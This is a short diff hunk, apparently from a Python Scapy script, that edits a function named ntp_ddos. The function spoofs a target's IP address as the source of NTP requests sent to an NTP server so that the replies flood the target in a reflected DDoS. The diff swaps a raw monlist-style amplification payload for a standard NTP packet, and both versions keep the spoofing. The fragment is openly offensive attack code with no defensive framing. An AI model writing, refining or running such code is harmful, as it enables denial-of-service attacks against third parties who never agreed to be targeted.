@@ -42,9 +42,7 @@ def ntp_ddos(target, ntp_server):
     """
     Send a NTP request to the NTP server with the spoofed IP address of the target to perform a reflected DDoS.
     """
-    data = "\x17\x00\x03\x2a" + "\x00" * 4
-    packet = IP(dst=ntp_server, src=target) / \
-        UDP(sport=random.randint(2000, 65535), dport=123)/Raw(load=data)
+    packet = IP(dst=ntp_server, src=target)/UDP(sport=random.randint(2000,65535),dport=123)/NTP(version=4)
     send(packet)
 
 
